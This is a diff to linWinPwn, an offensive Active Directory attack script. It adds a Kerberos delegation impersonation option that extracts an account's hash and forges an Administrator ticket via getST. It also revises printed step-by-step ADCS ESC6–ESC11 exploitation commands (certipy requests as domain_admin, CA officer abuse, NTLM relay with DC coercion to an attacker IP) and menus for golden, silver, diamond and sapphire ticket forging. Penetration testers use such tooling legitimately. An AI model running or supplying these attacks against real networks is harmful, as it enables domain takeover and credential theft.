@@ -62,6 +62,8 @@ impacket_ticketer=$(which ticketer.py)
 if [ ! -f "${impacket_ticketer}" ]; then impacket_ticketer=$(which impacket-ticketer); fi
 impacket_ticketconverter=$(which ticketConverter.py)
 if [ ! -f "${impacket_ticketconverter}" ]; then impacket_ticketconverter=$(which impacket-ticketconverter); fi
+impacket_getST=$(which getST.py)
+if [ ! -f "${impacket_getST}" ]; then impacket_getST=$(which impacket-getST); fi
 impacket_raiseChild=$(which raiseChild.py)
 if [ ! -f "${impacket_raiseChild}" ]; then impacket_raiseChild=$(which impacket-raiseChild); fi
 impacket_smbclient=$(which smbclient.py)
@@ -123,7 +125,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.6 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.7 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -1393,10 +1395,10 @@ adcs_vuln_parse (){
     esc6_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC6") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ ! -z $esc6_vuln ]]; then
         echo -e "${GREEN}[+] ESC6 vulnerability potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc6_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
+        for vulnca in $esc6_vuln; do
+            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target < ${pki_servers} > -template User -upn domain_admin@${dc_domain}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template User -upn domain_admin@${dc_domain}"
             echo -e "${CYAN}2. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
         done
@@ -1405,18 +1407,18 @@ adcs_vuln_parse (){
     esc7_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC7") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ ! -z $esc7_vuln ]]; then
         echo -e "${GREEN}[+] ESC7 vulnerability potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc7_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
+        for vulnca in $esc7_vuln; do
+            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
             echo -e "${CYAN}1. Add a new officer:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -add-officer "${user}" -dc-ip ${dc_ip}"
+            echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -add-officer "${user}" -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -enable-template SubCA -dc-ip ${dc_ip}"
+            echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -enable-template SubCA -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target < ${pki_servers} > -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -issue-request <request_ID> -dc-ip ${dc_ip}"
+            echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -issue-request <request_ID> -dc-ip ${dc_ip}"
             echo -e "${CYAN}5. Retrieve an issued certificate:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target < ${pki_servers} > -retrieve <request_ID> -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -retrieve <request_ID> -dc-ip ${dc_ip}"
             echo -e "${CYAN}6. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
         done
@@ -1425,8 +1427,8 @@ adcs_vuln_parse (){
     esc8_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC8") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ ! -z $esc8_vuln ]]; then
         echo -e "${GREEN}[+] ESC8 vulnerability potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc8_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
+        for vulnca in $esc8_vuln; do
+            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server:${NC}"
             echo -e "${certipy} relay -target http://${dc_ip}"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
@@ -1455,15 +1457,15 @@ adcs_vuln_parse (){
     esc10_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC10") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ ! -z $esc10_vuln ]]; then
         echo -e "${GREEN}[+] ESC10 vulnerability potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc10_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
+        for vulnca in $esc10_vuln; do
+            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
             echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
             echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Change userPrincipalName of user2 to domain_admin or DC:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\$@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Request certificate permitting client authentication as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca $vulntemp -template User -dc-ip ${dc_ip}"
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca $vulnca -template User -dc-ip ${dc_ip}"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}5. Authenticate using pfx of domain_admin or DC:${NC}"
@@ -1475,10 +1477,12 @@ adcs_vuln_parse (){
     esc11_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC11") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ ! -z $esc11_vuln ]]; then
         echo -e "${GREEN}[+] ESC11 vulnerability potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc11_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
+        for vulnca in $esc11_vuln; do
+            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):${NC}"
-            echo -e "ntlmrelayx.py -t rpc://< ${pki_servers} > -rpc-mode ICPR -icpr-ca-name $vulntemp -smb2support"
+            echo -e "ntlmrelayx.py -t rpc://< ${pki_servers} > -rpc-mode ICPR -icpr-ca-name $vulnca -smb2support"
+            echo -e "OR"
+            echo -e "${certipy} relay -target rpc://< ${pki_servers} > -ca ${vulnca}"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
             echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
         done
@@ -2415,7 +2419,7 @@ rbcd_attack () {
             ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add rbcd "${target_rbcd}$" "${service_rbcd}$" | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt 
             if [[ $(grep "can now impersonate users" ${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt 2>/dev/null) ]]; then
                 echo -e "${GREEN}[+] RBCD Attack successful! Run command below to generate ticket${NC}"
-                echo -e "getST.py -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${service_rbcd}$:PASSWORD'"
+                echo -e "${impacket_getST} -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${service_rbcd}$:PASSWORD'"
                 echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
                 echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} remove rbcd '${target_rbcd}$' '${service_rbcd}$'"
             fi
@@ -3367,11 +3371,12 @@ kerberos_menu () {
     echo -e "7) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)"
     echo -e "8) AP-REQ hijack with DNS unsecure updates abuse using krbjack"
     echo -e "9) Run custom Kerberoast attack using Orpheus"
-    echo -e "10) Generate Golden Ticket (requires: password or NTLM hash of Domain Admin)"
-    echo -e "11) Generate Silver Ticket (requires: password or NTLM hash of Domain Admin)"
-    echo -e "12) Generate Diamond Ticket (requires: password or NTLM hash of Domain Admin)"
-    echo -e "13) Generate Sapphire Ticket (requires: password or NTLM hash of Domain Admin)"
-    echo -e "14) Privilege escalation from Child Domain to Parent Domain using raiseChild"
+    echo -e "10) Generate Golden Ticket (requires: DCSync rights or hash of krbtgt)"
+    echo -e "11) Generate Silver Ticket (requires: DCSync rights or hash of service account)"
+    echo -e "12) Generate Diamond Ticket (requires: DCSync rights or hash of krbtgt)"
+    echo -e "13) Generate Sapphire Ticket (requires: DCSync rights or hash of krbtgt)"
+    echo -e "14) Privilege escalation from Child Domain to Parent Domain using raiseChild (requires: DA rights on child domain)"
+    echo -e "15) Impersonate another user through Delegation (requires: DCSync rights or hash of account allowed for delegation)"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -3431,7 +3436,7 @@ kerberos_menu () {
                 done
                 gethash_user="krbtgt"
                 gethash_hash=""
-                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DA rights):"
+                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DCSync rights):"
                 read -p ">> " gethash_hash </dev/tty
                 if [[ ${gethash_hash} == "" ]]; then 
                     get_hash
@@ -3507,7 +3512,7 @@ kerberos_menu () {
                     read -p ">> " ntlm_or_aes </dev/tty
                 done
                 gethash_hash=""
-                echo -e "Please specify the NTLM or AES hash of the SPN account (press Enter to extract hash from NTDS (requires DA rights):"
+                echo -e "Please specify the NTLM or AES hash of the SPN account (press Enter to extract hash from NTDS (requires DCSync rights):"
                 read -p ">> " gethash_hash </dev/tty
                 if [[ ${gethash_hash} == "" ]]; then
                     gethash_user=$tick_servuser
@@ -3557,7 +3562,7 @@ kerberos_menu () {
             fi
         fi
         kerberos_menu;;
-        
+
         12)
         if [ ! -f "${impacket_ticketer}" ]; then
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
@@ -3565,7 +3570,7 @@ kerberos_menu () {
             if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
                 gethash_user="krbtgt"
                 gethash_hash=""
-                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DA rights):"
+                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DCSync rights):"
                 read -p ">> " gethash_hash </dev/tty
                 if [[ ${gethash_hash} == "" ]]; then 
                     get_hash
@@ -3610,7 +3615,7 @@ kerberos_menu () {
             fi
         fi
         kerberos_menu;;
-        
+
         13)
         if [ ! -f "${impacket_ticketer}" ]; then
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
@@ -3618,7 +3623,7 @@ kerberos_menu () {
             if [ "${pass_bool}" == true ] ; then
                 gethash_user="krbtgt"
                 gethash_hash=""
-                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DA rights):"
+                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DCSync rights):"
                 read -p ">> " gethash_hash </dev/tty
                 if [[ ${gethash_hash} == "" ]]; then 
                     get_hash
@@ -3670,6 +3675,71 @@ kerberos_menu () {
 
         14)
         raise_child
+        kerberos_menu;;
+
+        15)
+        if [ ! -f "${impacket_getST}" ]; then
+            echo -e "${RED}[-] getST.py not found! Please verify the installation of impacket${NC}"
+        else
+            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
+                tick_randuser="Administrator"
+                tick_spn="CIFS/${dc_domain}"
+                tick_servuser=""
+
+                echo -e "Please specify name of account with Delegation rights (for example 'gmsa'):"
+                read -p ">> " tick_servuser </dev/tty
+                while [[ "${tick_servuser}" == "" ]] ; do
+                    echo -e "${RED}Invalid username.${NC} Please specify another:"
+                    read -p ">> " tick_servuser </dev/tty
+                done
+
+                echo -e "Please specify '1' for NTLM and '2' for AES:"
+                read -p ">> " ntlm_or_aes </dev/tty
+                while [[ "${ntlm_or_aes}" -ne 1 ]] && [[ "${ntlm_or_aes}" -ne 2 ]]; do
+                    echo -e "${RED}Wrong input${NC} Please specify '1' for NTLM and '2' for AES:"
+                    read -p ">> " ntlm_or_aes </dev/tty
+                done
+                gethash_hash=""
+                echo -e "Please specify the NTLM or AES hash of the delegation account (press Enter to extract hash from NTDS (requires DCSync rights):"
+                read -p ">> " gethash_hash </dev/tty
+                if [[ ${gethash_hash} == "" ]]; then
+                    gethash_user=$tick_servuser
+                    get_hash
+                else
+                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi 
+                fi
+
+                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
+                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
+                else
+                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_key="-hashes :${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi                
+
+                    echo -e "Please specify user name of user to impersonate (press Enter to choose default value 'Administrator'):"
+                    read -p ">> " tick_randuser_value </dev/tty
+                    if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                    echo -e "Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
+                    read -p ">> " tick_spn_value </dev/tty
+                    if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
+                    echo -e "${CYAN}[*] Requesting ticket for service $spn...${NC}"
+                    current_dir=$(pwd)
+                    cd ${output_dir}/Credentials
+                    run_command "${impacket_getST} ${domain}/${tick_servuser} -spn ${tick_spn} "${gethash_key}" -impersonate ${tick_randuser}"
+                    ticket_ccache_out="${tick_randuser}@$(echo ${tick_spn} | sed 's/\//_/g')@${dc_domain^^}.ccache"
+                    ticket_kirbi_out="${tick_randuser}@$(echo ${tick_spn} | sed 's/\//_/g')@${dc_domain^^}.kirbi"
+                    run_command "${impacket_ticketconverter} ./${ticket_ccache_out} ./${ticket_kirbi_out}"
+                    cd ${current_dir}
+                    if [ -f "${output_dir}/Credentials/${ticket_ccache_out}" ]; then
+                        echo -e "${GREEN}[+] Delegated ticket successfully requested :${NC}"
+                        echo -e "${output_dir}/Credentials/${ticket_ccache_out}"
+                        echo -e "${output_dir}/Credentials/${ticket_kirbi_out}"
+                    else
+                        echo -e "${RED}[-] Failed to request ticket${NC}"
+                    fi
+                fi
+            else
+                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
+            fi
+        fi
         kerberos_menu;;
 
         back)
@@ -4358,6 +4428,7 @@ config_menu () {
         if [ ! -f "${impacket_rpcdump}" ] ; then echo -e "${RED}[-] impacket's rpcdump is not installed${NC}"; else echo -e "${GREEN}[+] impacket's rpcdump is installed${NC}"; fi
         if [ ! -f "${impacket_reg}" ] ; then echo -e "${RED}[-] impacket's reg is not installed${NC}"; else echo -e "${GREEN}[+] impacket's reg is installed${NC}"; fi
         if [ ! -f "${impacket_ticketer}" ] ; then echo -e "${RED}[-] impacket's ticketer is not installed${NC}"; else echo -e "${GREEN}[+] impacket's ticketer is installed${NC}"; fi
+        if [ ! -f "${impacket_getST}" ] ; then echo -e "${RED}[-] impacket's getST is not installed${NC}"; else echo -e "${GREEN}[+] impacket's getST is installed${NC}"; fi
         if [ ! -f "${impacket_raiseChild}" ] ; then echo -e "${RED}[-] impacket's raiseChild is not installed${NC}"; else echo -e "${GREEN}[+] impacket's raiseChild is installed${NC}"; fi
         if [ ! -f "${bloodhound}" ] ; then echo -e "${RED}[-] bloodhound is not installed${NC}"; else echo -e "${GREEN}[+] bloodhound is installed${NC}"; fi
         if [ ! -f "${ldapdomaindump}" ] ; then echo -e "${RED}[-] ldapdomaindump is not installed${NC}"; else echo -e "${GREEN}[+] ldapdomaindump is installed${NC}"; fi
